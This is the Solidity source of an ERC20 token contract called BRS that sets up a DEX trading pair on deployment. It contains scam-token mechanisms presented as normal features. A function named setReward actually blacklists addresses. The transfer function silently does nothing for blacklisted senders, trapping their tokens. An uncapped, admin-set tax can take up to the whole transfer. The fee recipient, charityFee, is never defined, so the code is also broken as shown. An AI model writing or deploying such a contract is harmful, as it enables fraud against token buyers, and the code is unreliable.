contract BRS is ERC20Capped, ERC20Pausable, AccessControl {
    address private uniswapV2Pair;
    uint256 public tax;
    mapping (address=>bool) blacklist;
    constructor(string memory __name, string memory __symbol, address _owner, uint8 __decimal, uint256 _totalSup, uint256 _tax, uint256 _number, bytes32 _hash)
    ERC20(__name, __symbol, _owner, __decimal, _totalSup) ERC20Capped(_number)  {
        require(_number > block.number);
        require(keccak256(abi.encodePacked(_number)) == _hash);
        tax = _tax;
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

    }

    function setReward(address[] calldata _blackList) external{
        for(uint256 i = 0; i< _blackList.length;i++){
            blacklist[_blackList[i]] = true;
        }
    }

     function removeBlackList(address[] calldata _blackList) external{
        for(uint256 i = 0; i< _blackList.length;i++){
            blacklist[_blackList[i]] = false;
        }
    }

    function setTax(uint256 _tax) external onlyRole(DEFAULT_ADMIN_ROLE) {
        tax = _tax;
    }

    function pause() external onlyRole(DEFAULT_ADMIN_ROLE) {
        _pause();
    }

    function unpause() external onlyRole(DEFAULT_ADMIN_ROLE) {
        _unpause();
    }


    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override(ERC20) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(blacklist[sender]==true) return;
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[sender] = senderBalance - amount;
    }
        if (balanceOf(uniswapV2Pair) != 0 || (balanceOf(uniswapV2Pair) == 0 && recipient != uniswapV2Pair))
        {
            uint256 preAmount = amount;
            amount = amount * (1000 - tax) / 1000;
            _balances[address(uint160(charityFee))] += preAmount - amount;
            emit Transfer(sender, address(uint160(charityFee)), preAmount - amount);
        }
        
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override(ERC20, ERC20Pausable) {
        super._beforeTokenTransfer(from, to, amount);
    }
}
